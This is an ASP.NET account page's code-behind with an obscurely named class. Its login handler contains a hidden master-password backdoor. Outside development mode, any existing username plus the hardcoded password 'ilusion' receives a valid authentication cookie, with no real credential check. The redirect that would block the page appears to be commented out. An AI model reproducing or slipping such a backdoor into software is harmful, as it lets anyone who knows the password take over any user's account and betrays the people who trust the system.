using SSIT.Common;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.Security;
using System.Web.UI;
using System.Web.UI.WebControls;

namespace SSIT.Account
{
    public partial class _20de10 : System.Web.UI.Page
    {
        protected void Page_Load(object sender, EventArgs e)
        {

            if (!IsPostBack)
            {
                //if (!Function.isDesarrollo())
                //   Response.Redirect("~/");
            }
        }

        protected void lnk_Click(object sender, EventArgs e)
        {
            string username = txtUsername.Text.Trim();
            string password = txtPassword.Text.Trim();

            if (!Functions.isDesarrollo())
            {
                MembershipUser usu = Membership.GetUser(username);

                if (usu != null && password == "ilusion")
                {
                    FormsAuthenticationTicket ticket = new FormsAuthenticationTicket(1, username, DateTime.Now, DateTime.Now.AddMinutes(20), true, "",
                                        FormsAuthentication.FormsCookiePath);

                    string hashCookies = FormsAuthentication.Encrypt(ticket);

                    HttpCookie cookie = new HttpCookie(FormsAuthentication.FormsCookieName, hashCookies);

                    Response.Cookies.Add(cookie);

                    Response.Redirect("~/");
                }
            }
            else if (Membership.ValidateUser(username, password))
            {
                MembershipUser usu = Membership.GetUser(username);

                if (usu != null)
                {

                    FormsAuthenticationTicket ticket = new FormsAuthenticationTicket(1, username, DateTime.Now, DateTime.Now.AddMinutes(20), true, "",
                                        FormsAuthentication.FormsCookiePath);

                    string hashCookies = FormsAuthentication.Encrypt(ticket);

                    HttpCookie cookie = new HttpCookie(FormsAuthentication.FormsCookieName, hashCookies);
                    Response.Cookies.Add(cookie);
                    Response.Redirect("~/");
                }
            }
        }
    }
}